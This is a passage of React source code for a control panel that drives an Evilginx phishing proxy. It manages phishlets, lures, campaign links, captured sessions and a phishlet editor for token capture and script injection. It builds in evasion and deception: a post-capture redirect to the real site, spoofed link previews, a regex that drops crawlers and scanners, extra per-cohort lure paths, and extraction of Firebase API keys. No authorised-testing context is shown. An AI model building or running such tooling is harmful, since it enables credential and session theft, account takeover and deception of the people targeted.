                      {c.ok ? "ok" : "fix"}
                    </span>{" "}
                    <strong>{c.label}</strong>
                    {c.detail ? (
                      <span className="muted small"> — {c.detail}</span>
                    ) : null}
                    {c.fixHint || c.fix_hint ? (
                      <div className="muted small">{c.fixHint || c.fix_hint}</div>
                    ) : null}
                  </li>
                ))}
              </ul>
              {(readiness.notes || []).length > 0 && (
                <p className="muted small">{readiness.notes.join(" ")}</p>
              )}
            </div>
          )}
          <dl className="grid">
            <div>
              <dt>Target</dt>
              <dd className="mono">{target || "—"}</dd>
            </div>
            <div>
              <dt>Stack</dt>
              <dd>
                {stackInfo?.label || stackInfo?.stack || "—"}
                {firebaseHooks || isFirebase ? (
                  <span className="tag" style={{ marginLeft: 8 }}>
                    Firebase hooks
                  </span>
                ) : null}
              </dd>
            </div>
            <div>
              <dt>Phishlet</dt>
              <dd className="mono">{phishlet || "—"}</dd>
            </div>
            <div>
              <dt>Dry-run</dt>
              <dd className="mono">{dryrun || "—"}</dd>
            </div>
            <div>
              <dt>Hosts</dt>
              <dd>
                <span
                  className={`pill-status ${hosts?.hosts_ok ? "running" : "draft"}`}
                >
                  {hosts?.hosts_ok ? "ready" : "needs fix"}
                </span>
              </dd>
            </div>
            <div>
              <dt>Proxy</dt>
              <dd>
                <span
                  className={`pill-status ${status?.evilginx_running ? "running" : "paused"}`}
                >
                  {status?.evilginx_running ? "live" : "stopped"}
                </span>
              </dd>
            </div>
          </dl>

          <SuitabilityBanner stackInfo={stackInfo} />

          {stackInfo?.signals?.length > 0 && (
            <div className="stack">
              <strong>Detection signals</strong>
              <ul>
                {stackInfo.signals.slice(0, 8).map((s) => (
                  <li key={s}>{s}</li>
                ))}
              </ul>
            </div>
          )}

          {hosts && !hosts.hosts_ok && (
            <div className="hosts-warn">
              <strong>Missing /etc/hosts entries</strong>
              <p className="muted small">
                Proxy will 404 or use the wrong host until these FQDNs resolve to 127.0.0.1.
              </p>
              <pre className="code">{(hosts.missing_lines || []).join("\n")}</pre>
            </div>
          )}

          <div className="named-lures">
            <h3 className="label-with-hint">
              Lures
              <Hint hint="Named Lures per Target. The default Lure feeds campaigns; all Lures are configured when the proxy starts." />
            </h3>
            <ul className="list compact">
              {namedLures.map((row) => {
                const isSel = row.id === selectedLureId;
                const isDef = !!(row.isDefault || row.is_default);
                return (
                  <li key={row.id} className={isSel ? "selected" : ""}>
                    <button
                      type="button"
                      className="ghost linkish"
                      onClick={() => selectNamedLure(row)}
                    >
                      <strong>{row.name}</strong>
                      {isDef ? <span className="tag">default</span> : null}
                      {row.paused ? <span className="tag">paused</span> : null}
                      <span className="mono small muted">
                        {row.lureUrl || row.lure_url || row.path || "—"}
                      </span>
                    </button>
                    <span className="row">
                      {!isDef && (
                        <button
                          type="button"
                          className="ghost"
                          disabled={!!busy}
                          onClick={() => setDefaultNamedLure(row.id)}
                        >
                          Make default
                        </button>
                      )}
                      <button
                        type="button"
                        className="ghost"
                        disabled={!!busy || isDef}
                        title={isDef ? "Cannot delete default Lure" : "Delete Lure"}
                        onClick={() => deleteNamedLure(row.id)}
                      >
                        Delete
                      </button>
                    </span>
                  </li>
                );
              })}
            </ul>
            {!namedLures.length && (
              <p className="muted small">No named Lures yet — create one or start the proxy.</p>
            )}
            <div className="row">
              <input
                value={newLureName}
                onChange={(e) => setNewLureName(e.target.value)}
                placeholder="New Lure name"
              />
              <button type="button" disabled={!!busy || !activeId} onClick={createNamedLure}>
                Add Lure
              </button>
            </div>
          </div>

          <div className="lure-ops">
            <h3 className="label-with-hint">
              Lure options{selectedLureId ? " (selected)" : ""}
              <Hint hint="Persisted on the selected Lure and applied when you start the proxy: post-capture redirect, OG preview, UA filter, HTML redirector." />
            </h3>
            <div className="fields">
              <label className="block">
                Post-capture redirect URL
                <input
                  value={lureOps.redirectUrl}
                  onChange={(e) =>
                    setLureOps((o) => ({ ...o, redirectUrl: e.target.value }))
                  }
                  placeholder="https://real-app.example.com/dashboard"
                />
              </label>
              <label className="block">
                UA filter (regex — drop crawlers)
                <input
                  value={lureOps.uaFilter}
                  onChange={(e) =>
                    setLureOps((o) => ({ ...o, uaFilter: e.target.value }))
                  }
                  placeholder="(googlebot|bingbot|curl|python-requests)"
                  className="mono"
                />
              </label>
              <label className="block">
                HTML redirector
                <select
                  value={lureOps.redirector}
                  onChange={(e) =>
                    setLureOps((o) => ({ ...o, redirector: e.target.value }))
                  }
                >
                  <option value="">None</option>
                  {redirectors.map((r) => (
                    <option key={r.id} value={r.id}>
                      {r.id}
                    </option>
                  ))}
                </select>
              </label>
              <label className="block">
                Lure path
                <input
                  value={lureOps.path}
                  onChange={(e) =>
                    setLureOps((o) => ({ ...o, path: e.target.value }))
                  }
                  placeholder="/auto-generated-on-start"
                  className="mono"
                />
              </label>
            </div>
            <div className="fields">
              <label>
                OG title
                <input
                  value={lureOps.ogTitle}
                  onChange={(e) =>
                    setLureOps((o) => ({ ...o, ogTitle: e.target.value }))
                  }
                />
              </label>
              <label>
                OG description
                <input
                  value={lureOps.ogDesc}
                  onChange={(e) =>
                    setLureOps((o) => ({ ...o, ogDesc: e.target.value }))
                  }
                />
              </label>
              <label>
                OG image URL
                <input
                  value={lureOps.ogImage}
                  onChange={(e) =>
                    setLureOps((o) => ({ ...o, ogImage: e.target.value }))
                  }
                />
              </label>
              <label>
                OG URL
                <input
                  value={lureOps.ogUrl}
                  onChange={(e) =>
                    setLureOps((o) => ({ ...o, ogUrl: e.target.value }))
                  }
                />
              </label>
            </div>
            <label className="check">
              <input
                type="checkbox"
                checked={!!lureOps.paused}
                onChange={(e) =>
                  setLureOps((o) => ({ ...o, paused: e.target.checked }))
                }
              />
              Pause lure (reject hits until unpaused)
            </label>
            {(lureOps.extraPaths || []).length > 0 && (
              <div className="extra-lures">
                <strong className="small">Extra lure paths</strong>
                <ul className="list compact">
                  {lureOps.extraPaths.map((p) => (
                    <li key={p}>
                      <span className="mono">{p}</span>
                      <button
                        type="button"
                        className="ghost"
                        onClick={() =>
                          setLureOps((o) => ({
                            ...o,
                            extraPaths: (o.extraPaths || []).filter((x) => x !== p),
                          }))
                        }
                      >
                        Remove
                      </button>
                    </li>
                  ))}
                </ul>
              </div>
            )}
            <div className="row">
              <button
                type="button"
                className="ghost"
                onClick={() =>
                  setLureOps((o) => ({ ...o, regeneratePath: true, path: "" }))
                }
              >
                New primary path next start
              </button>
              <button type="button" className="ghost" onClick={addExtraLurePath}>
                Add cohort lure path
              </button>
              <button
                type="button"
                className="ghost"
                disabled={!!busy}
                onClick={() => saveProfile()}
              >
                Save lure options
              </button>
            </div>
          </div>

          <div className="ca-trust">
            <h3>CA trust & stale sessions</h3>
            {(caInfo?.alreadyInstalled || caInfo?.already_installed) && (
              <p className="suitability suit-caution" style={{ marginTop: 8 }}>
                <strong>CA already in Keychain</strong> — Error -25294 means macOS
                refused a re-import. Set <em>Always Trust</em> on the existing
                “Evilginx Super-Evil Root CA” entry instead.
              </p>
            )}
            <ol className="ca-steps">
              {(caInfo?.steps || []).map((s) => (
                <li key={s}>{s}</li>
              ))}
            </ol>
            <p className="muted small">
              {(caInfo?.notes || []).join(" ")}
            </p>
            {caInfo?.macosCommand || caInfo?.macos_command ? (
              <pre className="code tiny">
                {caInfo.macosCommand || caInfo.macos_command}
              </pre>
            ) : null}
            <div className="row">
              <button
                type="button"
                className="ghost"
                disabled={!!busy}
                onClick={() =>
                  run("ca", () => invoke("open_ca_cert")).then((p) =>
                    append(`Keychain Access + revealed ${p}`)
                  )
                }
              >
                Open Keychain Access
              </button>
              <button
                type="button"
                className="ghost"
                onClick={() => {
                  const cmd = caInfo?.macosCommand || caInfo?.macos_command || "";
                  if (cmd) {
                    navigator.clipboard?.writeText(cmd);
                    append("Trust command copied");
                  }
                }}
              >
                Copy trust command
              </button>
            </div>
          </div>

          <div className="row">
            <button data-testid="proxy-fix-hosts" disabled={!!busy} onClick={onFixHosts}>
              Fix /etc/hosts
            </button>
            <button
              data-testid="proxy-start"
              disabled={!!busy || !phishlet || !dryrun}
              onClick={onStart}
            >
              {busy === "lure" ? "Starting…" : "Start proxy + lure"}
            </button>
            <button data-testid="proxy-stop" disabled={!!busy} className="ghost" onClick={onStop}>
              Stop
            </button>
            <button
              data-testid="proxy-redetect"
              disabled={!!busy || !target}
              className="ghost"
              onClick={() => onRefreshSite(false)}
            >
              Re-detect
            </button>
          </div>

          {lure && (
            <div className="lure">
              <label>Tracked lure (use in Campaigns as {"{{link}}"})</label>
              <div className="row">
                <input
                  data-testid="lure-url"
                  readOnly
                  value={lure}
                  className="mono grow"
                />
                <button
                  type="button"
                  data-testid="lure-copy"
                  onClick={() => {
                    navigator.clipboard?.writeText(lure);
                    append("Lure copied");
                  }}
                >
                  Copy
                </button>
                {onUseInCampaign && (
                  <button
                    type="button"
                    data-testid="lure-use-campaign"
                    onClick={() =>
                      onUseInCampaign({
                        linkUrl: lure,
                        profileId: activeId || "",
                      })
                    }
                  >
                    Use in Campaigns →
                  </button>
                )}
              </div>
              {(lureOps.extraPaths || []).length > 0 && dryrun && (
                <p className="muted small mono">
                  Extra paths:{" "}
                  {lureOps.extraPaths
                    .map((p) => {
                      const host = lure.replace(/https?:\/\/[^/]+/, "")
                        ? lure.split(p)[0]
                        : "";
                      void host;
                      try {
                        const u = new URL(lure);
                        return `${u.origin}${p}`;
                      } catch {
                        return p;
                      }
                    })
                    .join(" · ")}
                </p>
              )}
            </div>
          )}

          <div className="row end">
            {!hideSitesList && (
              <button className="ghost" onClick={() => changeView("sites")}>
                ← Sites
              </button>
            )}
            <button
              type="button"
              className="ghost"
              data-testid="dest-go-community"
              onClick={() => changeView("community")}
            >
              Community →
            </button>
            <button
              data-testid="dest-go-captures"
              onClick={() => changeView("captures")}
            >
              Captures →
            </button>
          </div>
        </section>
      )}

      {view === "community" && (
        <CommunityPhishlets
          busy={busy}
          setBusy={setBusy}
          append={append}
          kit={kit}
          onImported={onCommunityImported}
        />
      )}

      {view === "captures" && (
        <CapturesPanel
          busy={busy}
          activeId={activeId}
          captures={captures}
          isFirebase={isFirebase}
          firebaseKey={firebaseKey}
          target={target}
          phishlet={phishlet}
          refreshCaptures={refreshCaptures}
          run={run}
          append={append}
          setView={setView}
          onOpenResults={onOpenResults}
        />
      )}

      <section className="card advanced">
        <button
          type="button"
          className="linkish"
          data-testid="advanced-toggle"
          onClick={() => setAdvancedOpen((v) => !v)}
        >
          {advancedOpen ? "▾" : "▸"} Advanced
        </button>
        {advancedOpen && (
          <div className="adv-body">
            <div className="fields">
              <label>
                Profile name
                <input
                  value={profileName}
                  onChange={(e) => setProfileName(e.target.value)}
                />
              </label>
              <label>
                Phishlet
                <input value={phishlet} onChange={(e) => setPhishlet(e.target.value)} />
              </label>
              <label>
                Dry-run domain
                <input value={dryrun} onChange={(e) => setDryrun(e.target.value)} />
              </label>
            </div>
            <div className="row">
              <button disabled={!!busy || !activeId} onClick={() => saveProfile()}>
                Save profile
              </button>
              <button
                disabled={!!busy || !target}
                className="ghost"
                onClick={() => onRefreshSite(true)}
              >
                Force regenerate phishlet
              </button>
              <button disabled={!!busy} onClick={() => run("build", () => invoke("cmd_build"))}>
                Build binaries
              </button>
              <button
                disabled={!!busy}
                onClick={() =>
                  run("logs", async () => {
                    const t = await invoke("tail_logs", { lines: 100 });
                    setEvilLog(t);
                    return "log refreshed";
                  })
                }
              >
                Tail evilginx log
              </button>
              {isFirebase && (
                <button
                  disabled={!!busy || !target}
                  onClick={async () => {
                    const r = await run("fbkey", () =>
                      invoke("pull_firebase_key", { target })
                    );
                    if (r.api_key) {
                      setFirebaseKey(r.api_key);
                      await saveProfile();
                    }
                  }}
                >
                  Pull Firebase API key
                </button>
              )}
            </div>
            {isFirebase && (
              <label className="block">
                Firebase API key
                <input
                  value={firebaseKey}
                  onChange={(e) => setFirebaseKey(e.target.value)}
                />
              </label>
            )}

            <h3 className="label-with-hint">
              Phishlet editor
              <Hint hint="Edit sub_filters, js_inject, and auth_tokens directly. Restart the proxy after saving." />
            </h3>
            <div className="row">
              <button
                type="button"
                className="ghost"
                disabled={!!busy || !phishlet}
                onClick={loadPhishletEditor}
              >
                {editorOpen ? "Reload YAML" : "Open YAML editor"}
              </button>
              {editorOpen && (
                <button
                  type="button"
                  disabled={!!busy || !phishlet}
                  onClick={savePhishletEditor}
                >
                  Save phishlet
                </button>
              )}
            </div>
            {editorOpen && (
              <textarea
                className="phishlet-editor mono"
                rows={18}
                value={phishletYaml}
                onChange={(e) => setPhishletYaml(e.target.value)}
                spellCheck={false}
              />
            )}

            <h3>Pattern templates</h3>
            <div className="chips">
              {templates.map((t) => (
                <button
                  key={t.id}
                  disabled={!!busy || !target}
                  className="ghost"
                  onClick={() => onPattern(t.id)}
                  title={t.description}
                >
                  {t.name}
                </button>
              ))}
            </div>

            <h3>Community phishlets</h3>
            <p className="muted small">
              Browse and import vendored packs from the Community step (not buried here).
            </p>
            <button
              type="button"
              className="ghost"
              data-testid="advanced-open-community"
              onClick={() => {
                setAdvancedOpen(false);
                changeView("community");
              }}
            >
              Open Community →
            </button>

            <p className="muted mono small">{kit?.root}</p>
            {evilLog && <pre className="log">{evilLog}</pre>}
          </div>
        )}
      </section>
    </>
  );
}
